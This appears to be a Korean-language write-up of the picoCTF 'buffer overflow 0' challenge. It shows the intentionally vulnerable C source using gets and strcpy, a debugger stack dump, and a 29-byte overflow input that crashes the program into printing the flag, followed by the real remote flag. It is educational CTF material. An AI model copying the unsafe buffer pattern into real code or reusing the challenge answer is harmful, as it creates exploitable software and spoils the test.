# [buffer overflow 0](https://play.picoctf.org/practice/challenge/257?category=6&originalEvent=70&page=1)
<br />

**Discription:**
> Let's start off simple, can you overflow the correct buffer?
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
<br />

**Binary Protections:**
```yaml
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped

[*] '/home/kali/pico/buf_0/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<br />

> [!NOTE]
> ```bash
> $ cat flag.txt
> pico{this_is_flag}
> ```

<br />
<br />

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
...
signal(SIGSEGV, sigsegv_handler); // Set up signal handler
```
소스코드를 보면 `SIGSEGV`가 발생하면 FLAG를 출력합니다. 

<br />

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
...
  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
gets는 `"\n"`를 만날때까지 입력을 받습니다. 이는 스택 버퍼오버플로우가 발생합니다. `vuln`은 `gets`로 입력받은 값을 복사하여 `buf2`에 저장합니다. 함수는 할 일을 다하면 `Return address(RET)`를 통해 원래 있던 곳으로 복귀합니다. 이때 `RET`이 가리키는 값이 유효하지 않을 경우, `SIGSEGV`가 발생하고 프로그램을 종료합니다.

<br />

```asm
pwndbg> b *vuln+38
Breakpoint 1 at 0x56556379
pwndbg> r
Starting program: /home/kali/pico/buf_0/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Input: AAAABBBBCCCC
...
pwndbg> x/32x 0xffffd130
0xffffd130:     0x41414141      0x42424242      0x43434343      0x56558f00
0xffffd140:     0x565564a0      0x56558fac      0xffffd1d8      0x56556477
0xffffd150:     0xffffd164      0x000003e8      0x000003e8      0x5655641f
0xffffd160:     0x1f8bfbff      0x41414141      0x42424242      0x43434343
0xffffd170:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd180:     0x00000000      0xffffd3eb      0x00000002      0x00000000
0xffffd190:     0x00000000      0x00000000      0x00000000      0xffffdfdd
0xffffd1a0:     0xf7fc5540      0xf7fc5000      0x00000000      0x00000000
pwndbg> x/a 0x56556477
0x56556477 <main+245>:  0x8310c483
```
`"AAAABBBBCCCC"`를 입력하고, `strcpy` 호출 직후의 스택 상태를 보겠습니다. `buf2`에는 입력 값이 복사가 되어 있는 것을 알 수 있으며, `0x56556477`는 `RET` 입니다. 따라서 버퍼를 29바이트이상 채우면 `RET`이 유효하지 않은 주소를 가리키므로, `SIGSEGV`가 발생할 것입니다.

<br />

```bash
$ ./vuln
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
pico{this_is_flag}
```

<br />

**Remote:**
```bash
$ nc saturn.picoctf.net 55280
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```


